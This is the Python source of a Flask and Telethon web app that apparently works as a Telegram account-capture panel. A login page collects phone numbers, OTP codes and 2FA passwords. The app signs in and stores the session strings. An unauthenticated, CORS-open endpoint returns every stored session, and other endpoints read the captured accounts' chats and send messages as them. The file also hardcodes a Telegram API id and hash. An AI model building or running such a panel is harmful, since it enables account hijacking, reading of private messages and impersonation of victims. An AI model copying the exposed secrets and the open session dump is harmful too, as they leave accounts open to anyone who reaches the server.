from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import json
import os
import asyncio
import threading
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Your API credentials
api_id = 33465589
api_hash = '08bdab35790bf1fdf20c16a50bd323b8'

# Store temporary data for OTP
temp_data = {}

# Store accounts persistently
accounts = []
if os.path.exists('accounts.json'):
    try:
        with open('accounts.json', 'r') as f:
            accounts = json.load(f)
    except:
        accounts = []

def save_accounts():
    with open('accounts.json', 'w') as f:
        json.dump(accounts, f, indent=2)

# Run async in a separate thread
def run_async(coro):
    """Run async function in a new thread with its own event loop"""
    result = None
    error = None
    
    def run():
        nonlocal result, error
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(coro)
            loop.close()
        except Exception as e:
            error = e
    
    thread = threading.Thread(target=run)
    thread.start()
    thread.join()
    
    if error:
        raise error
    return result

@app.route('/')
def serve_login():
    return send_file('login.html')

@app.route('/dashboard')
def serve_dashboard():
    return send_file('dashboard.html')

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    account_list = [{
        'id': a['id'],
        'phone': a['phone'],
        'name': a['name'],
        'username': a.get('username', ''),
        'session': a.get('session', a.get('string_session', ''))
    } for a in accounts]
    return jsonify({'success': True, 'accounts': account_list})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    async def send_code():
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        result = await client.send_code_request(phone)
        session_str = client.session.save()
        await client.disconnect()
        return result.phone_code_hash, session_str
    
    try:
        phone_code_hash, session_str = run_async(send_code())
        session_id = str(int(datetime.now().timestamp()))
        temp_data[session_id] = {
            'phone': phone,
            'phone_code_hash': phone_code_hash,
            'session_str': session_str
        }
        return jsonify({'success': True, 'session_id': session_id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if session_id not in temp_data:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session = temp_data[session_id]
    phone = session['phone']
    phone_code_hash = session['phone_code_hash']
    session_str = session['session_str']
    
    async def verify():
        client = TelegramClient(StringSession(session_str), api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            me = await client.get_me()
            string_session = client.session.save()
            await client.disconnect()
            return {'success': True, 'me': me, 'session': string_session}
        except errors.SessionPasswordNeededError:
            if password:
                await client.sign_in(password=password)
                me = await client.get_me()
                string_session = client.session.save()
                await client.disconnect()
                return {'success': True, 'me': me, 'session': string_session}
            else:
                await client.disconnect()
                return {'success': False, 'need_password': True}
        except Exception as e:
            await client.disconnect()
            return {'success': False, 'error': str(e)}
    
    try:
        result = run_async(verify())
        if result.get('success'):
            me = result['me']
            string_session = result['session']
            account = {
                'id': len(accounts) + 1,
                'phone': phone,
                'name': me.first_name or 'User',
                'username': me.username or '',
                'session': string_session,
                'date': str(datetime.now())
            }
            accounts.append(account)
            save_accounts()
            del temp_data[session_id]
            return jsonify({'success': True, 'account': account})
        elif result.get('need_password'):
            return jsonify({'success': False, 'need_password': True})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    async def fetch():
        client = TelegramClient(StringSession(session_string), api_id, api_hash)
        await client.connect()
        dialogs = await client.get_dialogs(limit=20)
        chats = []
        all_messages = []
        for dialog in dialogs:
            name = dialog.name or 'Unknown'
            chat_id = str(dialog.id)
            chats.append({
                'id': chat_id,
                'title': name,
                'unread': dialog.unread_count or 0,
                'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else '',
                'lastMessageDate': dialog.message.date.timestamp() if dialog.message else None
            })
            try:
                msgs = await client.get_messages(dialog.entity, limit=10)
                for msg in msgs:
                    if msg and msg.text:
                        all_messages.append({
                            'chatId': chat_id,
                            'text': msg.text,
                            'date': msg.date.timestamp(),
                            'out': msg.out
                        })
            except:
                pass
        await client.disconnect()
        return {'chats': chats, 'messages': all_messages}
    
    try:
        result = run_async(fetch())
        return jsonify({'success': True, 'chats': result['chats'], 'messages': result['messages']})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    async def send():
        client = TelegramClient(StringSession(session_string), api_id, api_hash)
        await client.connect()
        try:
            entity = await client.get_entity(int(chat_id))
        except:
            entity = await client.get_entity(chat_id)
        await client.send_message(entity, message)
        await client.disconnect()
    
    try:
        run_async(send())
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Server starting on port {port}...")
    app.run(host='0.0.0.0', port=port)
